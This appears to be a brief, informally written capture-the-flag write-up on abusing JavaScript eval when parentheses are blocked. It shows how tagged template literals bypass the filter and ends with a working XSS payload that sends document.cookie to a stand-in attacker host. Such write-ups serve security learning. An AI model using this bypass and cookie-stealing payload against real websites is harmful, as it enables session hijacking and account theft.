eval in javascript is a known dangerous function which can execute arbitary code 
abouve calculation
eval(1+1) 
2
eval(1+1+alert())
1+1 is 2 and then when its add a funciton its execute the function and return the nan
in this challenge we can see that the () are not allowed to be used 
so i cheked mdn and i found that in js we can use backticks to execute show fonction 
like console.log and so on 
so i tryed 1+1+alert`xss` and its worked 
so i found also the ${expression} so i used this payload
1+1+`${document.location="https://atacker/c?c="+document.cookie}`
